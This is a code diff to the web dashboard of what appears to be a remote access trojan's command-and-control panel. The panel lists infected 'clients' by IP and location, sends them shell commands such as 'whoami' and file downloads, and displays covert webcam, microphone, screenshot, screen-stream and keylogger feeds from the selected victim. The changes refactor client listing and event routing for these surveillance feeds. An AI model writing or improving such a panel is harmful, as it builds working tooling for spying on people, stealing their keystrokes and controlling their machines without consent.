@@ -624,7 +624,7 @@
                 </div>
                 <div class="status-item">
                     <div class="status-icon clients">◆</div>
-                    <div class="status-text" id="client-count">0 Clients Connected</div>
+                    <div class="status-text" id="client-count">{% if clients %}{{ clients|length }} Clients Connected{% else %}0 Clients Connected{% endif %}</div>
                 </div>
                 <div class="status-item">
                     <div class="status-icon time">◉</div>
@@ -643,19 +643,13 @@
                     <div class="clients-list" id="clients-list">
                         {% if clients %}
                             {% for client in clients %}
-                                <div class="client-item" data-client-id="{{ client.id }}">
+                                <div class="client-item" data-client-id="{{ client }}">
                                     <div class="client-header">
-                                        <span class="client-ip">
-                                            {{ client.system.network.ip_addresses[0] if client.system.network and client.system.network.ip_addresses else 'Unknown' }}
-                                        </span>
-                                        <span class="client-status {{ 'active' if client.activity.status == 'active' else 'idle' }}">
-                                            {{ client.activity.status.capitalize() }}
-                                        </span>
+                                        <span class="client-ip">{{ client }}</span>
+                                        <span class="client-status">Online</span>
                                     </div>
                                     <div class="client-details">
-                                        IP: {{ client.system.network.ip_addresses|join(', ') if client.system.network and client.system.network.ip_addresses else 'Unknown' }} | 
-                                        Location: {{ client.system.network.location.city if client.system.network and client.system.network.location and client.system.network.location.city else 'Unknown' }}, 
-                                        {{ client.system.network.location.country if client.system.network and client.system.network.location and client.system.network.location.country else 'Unknown' }}
+                                        IP: Unknown | Location: Unknown
                                     </div>
                                 </div>
                             {% endfor %}
@@ -700,9 +694,7 @@
                             <select id="client-select" class="form-select">
                                 <option value="">Select a client</option>
                                 {% for client in clients %}
-                                    <option value="{{ client.id }}">
-                                        {{ client.id }} ({{ client.system.network.ip_addresses[0] if client.system.network and client.system.network.ip_addresses else 'Unknown' }})
-                                    </option>
+                                    <option value="{{ client }}">{{ client }}</option>
                                 {% endfor %}
                             </select>
                             <input type="text" id="command-input" class="form-input" placeholder="Enter command (e.g., dir, whoami, download path/to/file)">
@@ -818,7 +810,7 @@
     </div>
 
     <script>
-        const socket = io('/', { transports: ['websocket', 'polling'] });  // Explicitly connect to default namespace
+        const socket = io();
         let selectedClient = null;
         let systemChart, networkChart;
         const systemData = { cpu: [], memory: [], labels: [] };
@@ -844,9 +836,9 @@
                     ]
                 },
                 options: {
-                    scales: { 
+                    scales: {
                         x: { title: { display: true, text: 'Time', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } },
-                        y: { title: { display: true, text: 'Usage', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } } 
+                        y: { title: { display: true, text: 'Usage', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } }
                     },
                     plugins: { legend: { labels: { color: '#b3c4d8' } } },
                     responsive: true,
@@ -865,9 +857,9 @@
                     ]
                 },
                 options: {
-                    scales: { 
+                    scales: {
                         x: { title: { display: true, text: 'Time', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } },
-                        y: { title: { display: true, text: 'Speed (Mbps)', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } } 
+                        y: { title: { display: true, text: 'Speed (Mbps)', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } }
                     },
                     plugins: { legend: { labels: { color: '#b3c4d8' } } },
                     responsive: true,
@@ -900,9 +892,9 @@
                 const system = client.system || {};
                 const network = system.network || {};
                 const ipAddresses = network.ip_addresses || ['Unknown'];
-                const location = network.location || 'Unknown';
-                const city = typeof location === 'object' ? (location.city || 'Unknown') : 'Unknown';
-                const country = typeof location === 'object' ? (location.country || 'Unknown') : 'Unknown';
+                const location = network.location || {};
+                const city = location.city || 'Unknown';
+                const country = location.country || 'Unknown';
 
                 clientItem.innerHTML = `
                     <div class="client-header">
@@ -918,7 +910,7 @@
                     document.querySelectorAll('.client-item').forEach(item => item.classList.remove('selected'));
                     clientItem.classList.add('selected');
                     selectedClient = client.id;
-                    document.getElementById('client-select').value = client.id;
+                    document.getElementById('client-select').value = client.id; // Sync dropdown with selection
                 });
 
                 clientList.appendChild(clientItem);
@@ -927,7 +919,7 @@
                 option.value = client.id;
                 option.textContent = `${client.id} (${ipAddresses[0]})`;
                 if (selectedClient === client.id) {
-                    option.selected = true;
+                    option.selected = true; // Keep the dropdown selection
                 }
                 clientSelect.appendChild(option);
             });
@@ -975,8 +967,6 @@
         }
 
         function updateMedia(data) {
-            console.log(`Received ${data.type} for client ${data.client_id}`); // Debug log
-            if (data.client_id !== selectedClient) return; // Only update for selected client
             if (data.image) {
                 if (data.type === "webcam_data") {
                     document.getElementById('webcam-image').src = `data:image/jpeg;base64,${data.image}`;
@@ -1048,13 +1038,13 @@
 
             document.getElementById('start-stream-btn').addEventListener('click', () => {
                 if (selectedClient) {
-                    socket.emit('command', { to: selectedClient, command: 'start_stream' });
+                    socket.emit('command', 'start_stream', { to: selectedClient });
                 }
             });
 
             document.getElementById('stop-stream-btn').addEventListener('click', () => {
                 if (selectedClient) {
-                    socket.emit('command', { to: selectedClient, command: 'stop_stream' });
+                    socket.emit('command', 'stop_stream', { to: selectedClient });
                 }
             });
         }
@@ -1105,6 +1095,7 @@
             });
         });
 
+        // Add dropdown change event to sync with selectedClient
         document.getElementById('client-select').addEventListener('change', (e) => {
             selectedClient = e.target.value;
             document.querySelectorAll('.client-item').forEach(item => {
@@ -1112,19 +1103,11 @@
             });
         });
 
-        socket.on('connect', () => {
-            console.log('Socket.IO connected to default namespace');
+        socket.on('client_update', (clients) => {
             socket.emit('request_client_info');
-            initializeCharts();
-            setupRemoteDesktopControls();
-        });
-
-        socket.on('connect_error', (error) => {
-            console.error('Socket.IO connection error:', error);
         });
 
         socket.on('client_info', (clients) => {
-            console.log('Received client_info:', clients); // Debug log
             updateClientList(clients);
         });
 
@@ -1145,25 +1128,39 @@
         });
 
         socket.on('webcam_data', (data) => {
-            updateMedia(data);
+            if (data.client_id === selectedClient) {
+                updateMedia(data);
+            }
         });
 
         socket.on('mic_data', (data) => {
-            updateMedia(data);
+            if (data.client_id === selectedClient) {
+                updateMedia(data);
+            }
         });
 
         socket.on('screenshot_data', (data) => {
-            updateMedia(data);
+            if (data.client_id === selectedClient) {
+                updateMedia(data);
+            }
         });
 
         socket.on('screen_stream', (data) => {
-            updateMedia(data);
+            if (data.client_id === selectedClient) {
+                updateMedia(data);
+            }
         });
 
         socket.on('keylog_data', (data) => {
             if (data.client_id === selectedClient) {
                 updateKeylogs(data);
             }
+        });
+
+        socket.on('connect', () => {
+            socket.emit('request_client_info');
+            initializeCharts();
+            setupRemoteDesktopControls();
         });
     </script>
 </body>
